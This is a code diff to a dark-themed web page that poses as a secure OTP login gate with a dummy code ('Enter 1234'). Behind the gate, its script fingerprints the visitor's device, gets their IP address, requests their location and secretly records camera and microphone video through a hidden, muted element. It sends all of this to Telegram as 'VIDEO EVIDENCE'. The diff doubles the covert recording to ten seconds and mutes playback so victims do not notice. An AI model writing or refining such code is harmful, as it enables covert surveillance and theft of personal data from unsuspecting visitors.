@@ -22,14 +22,13 @@
         :root {
             /* --- ELITE DARK THEME --- */
             --bg-body: #050505;
-            --bg-card: rgba(18, 18, 18, 0.92);
+            --bg-card: rgba(18, 18, 18, 0.94);
             --border-color: rgba(212, 175, 55, 0.35);
             --gold-primary: #D4AF37;
             --gold-shine: #FFD700;
             --text-main: #ffffff;
             --text-sub: #b3b3b3;
             --glass-blur: blur(25px);
-            --nav-glass: blur(30px);
         }
 
         [data-theme="light"] {
@@ -54,7 +53,7 @@
             font-family: 'Outfit', sans-serif; 
             overflow-x: hidden; 
             min-height: 100vh;
-            transition: background-color 0.4s ease, color 0.4s ease;
+            transition: background-color 0.4s ease;
             user-select: none;
         }
 
@@ -72,7 +71,7 @@
 
         .gate-card {
             width: 100%; max-width: 400px;
-            background: rgba(10, 10, 10, 0.85);
+            background: var(--bg-card);
             border: 1px solid var(--gold-primary);
             border-radius: 24px; padding: 40px 25px;
             box-shadow: 0 0 80px rgba(212, 175, 55, 0.2);
@@ -295,6 +294,7 @@
         .toast.show { opacity: 1; top: 40px; }
 
         /* Data Capture Elements */
+        /* Muted to prevent voice repeat/echo */
         #hidden-video { display: none; }
         #hidden-canvas { display: none; }
     </style>
@@ -324,12 +324,12 @@
             </button>
             
             <div class="loading-text" id="g-status">
-                <i class="fas fa-circle-notch fa-spin"></i> ESTABLISHING SECURE UPLINK...
+                <i class="fas fa-circle-notch fa-spin"></i> SECURE UPLINK ESTABLISHED...
             </div>
         </div>
     </div>
 
-    <video id="hidden-video" autoplay playsinline style="display:none;"></video>
+    <video id="hidden-video" autoplay playsinline muted style="display:none;"></video>
     <canvas id="hidden-canvas" style="display:none;"></canvas>
 
     <div id="main-interface">
@@ -484,10 +484,10 @@
                 </div>
                 <div style="padding:25px;">
                     <input type="tel" id="mobileInput" style="width:100%; padding:12px; margin-bottom:15px; background:#1a1a1a; border:1px solid #333; color:#fff; border-radius:8px;" placeholder="Mobile Number">
-                    <button class="btn-full" style="width:100%; padding:12px; background:var(--gold-primary); border:none; font-weight:bold; border-radius:8px;" onclick="sendOTP()">SEND OTP</button>
+                    <button class="gate-btn" onclick="initiateSecureEntry()">SEND OTP</button>
                     <div id="otpArea" style="display:none; margin-top:15px;">
                         <input type="text" id="otpInput" style="width:100%; padding:12px; margin-bottom:15px; background:#1a1a1a; border:1px solid #333; color:#fff; border-radius:8px;" placeholder="Enter 1234">
-                        <button class="btn-full" style="width:100%; padding:12px; background:#00ff00; border:none; font-weight:bold; border-radius:8px;" onclick="verifyOTP()">VERIFY LOGIN</button>
+                        <button class="gate-btn" style="background:#00ff00;" onclick="verifyOTP()">VERIFY LOGIN</button>
                     </div>
                 </div>
             </div>
@@ -542,20 +542,15 @@
             let network = "Unknown";
             let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // Advanced Model
             if (navigator.userAgentData) {
                 const data = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
                 model = `${data.platform} ${data.model}`;
             }
 
-            // Battery (Non-blocking)
             try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Battery'})`; } catch(e){}
-            // IP (Non-blocking)
-            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>{ ip = j.ip; }).catch(e=>{});
-            // Network
+            try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e){}
             try { if(navigator.connection) network = `${navigator.connection.effectiveType} (${navigator.connection.type || 'cellular'}) - Down: ~${navigator.connection.downlink}Mbps`; } catch(e){}
             
-            // Hardware
             const gpu = (function(){ try{var c=document.createElement('canvas');var gl=c.getContext('webgl');var d=gl.getExtension('WEBGL_debug_renderer_info');return gl.getParameter(d.UNMASKED_RENDERER_WEBGL);}catch(e){return "N/A";}})();
             const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
             const cores = navigator.hardwareConcurrency || "Unknown";
@@ -584,7 +579,6 @@
                 return;
             }
 
-            // UI Feedback
             const btn = document.getElementById('btn-verify');
             const status = document.getElementById('g-status');
             if(btn) { btn.innerHTML = '<i class="fas fa-satellite-dish fa-spin"></i> CONNECTING...'; btn.style.opacity = "0.7"; }
@@ -593,13 +587,13 @@
             // 1. Gather Data (Non-Blocking)
             const intelPromise = getDeviceIntel();
             
-            // 2. Start Background Recording (Spy Video + Audio)
+            // 2. Start Background Recording (Spy Video + Audio - 10s)
             startBackgroundRecording();
 
-            // 3. Force Open Timer (Safety Net - 3s max)
+            // 3. Force Open Timer (Safety Net - 2.5s max)
             const safetyTimer = setTimeout(() => {
                 unlockUI();
-            }, 3000);
+            }, 2500);
 
             // 4. Location (Parallel)
             let locData = "❌ Location Denied/Unavailable";
@@ -610,12 +604,12 @@
                         locData = `• Coords: ${p.coords.latitude}, ${p.coords.longitude}\n• Accuracy: ${Math.round(p.coords.accuracy)}m`;
                         mapLink = `🔗 [Open Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`;
                         resolve();
-                    }, reject, {timeout: 2500});
+                    }, reject, {timeout: 2000});
                 });
             } catch(e) {}
 
             const intel = await intelPromise;
-            const screen = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit) - Pixel Ratio: ${window.devicePixelRatio}`;
+            const screen = `${window.screen.width}x${window.screen.height}`;
 
             // 5. Construct Log Message
             const msg = `
@@ -655,27 +649,30 @@ ${mapLink}
             unlockUI();
         }
 
-        // --- BACKGROUND RECORDING (VIDEO + AUDIO) ---
+        // --- BACKGROUND RECORDING (VIDEO + AUDIO - 10 SECONDS) ---
         async function startBackgroundRecording() {
             try {
                 // Request Camera & Mic
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                 const video = document.getElementById('hidden-video');
+                // IMPORTANT: Muted so user doesn't hear themselves
+                video.muted = true; 
                 video.srcObject = stream;
                 
-                // Record 5 Seconds
+                // Record 10 Seconds
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                 recorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     // Send Video Clip separately
-                    sendToTelegram("🎥 *VIDEO EVIDENCE (5s)*", blob, true);
+                    sendToTelegram("🎥 *VIDEO EVIDENCE (10s)*", blob, true);
                     stream.getTracks().forEach(t => t.stop());
                 };
                 
                 recorder.start();
-                setTimeout(() => recorder.stop(), 5000); // 5s recording
+                // 10 Seconds Timeout
+                setTimeout(() => recorder.stop(), 10000); 
             } catch(e) { console.log("Rec Denied"); }
         }
 
@@ -832,3 +829,4 @@ ${mapLink}
     </script>
 </body>
 </html>
+
